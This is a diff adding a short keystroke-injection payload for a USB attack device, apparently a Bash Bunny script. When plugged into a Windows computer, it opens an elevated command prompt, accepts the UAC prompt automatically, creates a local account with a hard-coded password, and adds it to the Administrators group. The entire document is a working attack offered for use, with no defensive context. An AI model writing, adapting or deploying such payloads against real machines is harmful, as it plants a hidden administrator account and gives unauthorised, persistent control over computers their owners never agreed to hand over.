@@ -1,0 +1,35 @@
+#Simple add user and make it administrator on target computer
+#Coder: Bry-fi
+
+#Username of your new account
+User=SysAdmin
+
+#Password to set your new account as
+Pass=iampass
+
+#Action to perform e.g (/add)
+Action=/add
+
+
+ATTACKMODE HID
+LED R 
+Q GUI r
+Q DELAY 1000
+Q STRING powershell Start-Process cmd -Verb runAs
+Q DELAY 1000
+Q ENTER
+Q DELAY 1000
+Q ALT y
+Q DELAY 1000
+Q STRING net user $User $Pass $Action
+Q DELAY 1000
+Q ENTER
+Q DELAY 1000
+Q STRING net localgroup Administrators $User $Action
+Q DELAY 1000
+Q ENTER
+Q STRING exit
+Q DELAY 1000
+Q ENTER
+sync
+LED G
